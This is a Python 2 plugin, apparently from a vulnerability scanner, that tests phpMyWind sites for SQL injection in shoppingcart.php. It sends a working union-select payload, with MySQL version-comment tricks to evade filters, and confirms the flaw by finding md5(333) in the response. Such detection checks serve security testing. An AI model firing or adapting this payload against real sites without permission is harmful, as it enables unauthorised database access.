#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        exp = "shoppingcart.php?a=addshopingcart&goodsid=1%20and%20@`'`%20/*!50000union*/%20select%20null,null,null,null,null,null,null,null,null,null,md5(333),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20from%20mysql.user%20where%201=1%20or%20@`'`&buynum=1&goodsattr=tpcs"
        exp2 = "shoppingcart.php"
        url1 = url+exp
        url2 = url+exp2
        #res, content = http.request(url1)
        res, content = yx_httplib2_request(http,url1)
        if not res.has_key('set-cookie'):
            return list
        headers = {'Cookie': res['set-cookie']} 
        if res['status'] == '200' and content.find('1')>=0:
            #res2, content2 = http.request(url2,headers = headers)
            res2, content2 = yx_httplib2_request(http,url2,headers = headers)
            if res2['status'] == '200' and content2.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:               
                request = getRequest(url2)
                response = getResponse(res2)
                list.append(getRecord(ob,url1,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:phpMyWind_shoppingcart_Sqlinjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpMyWind_shoppingcart_Sqlinjection.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
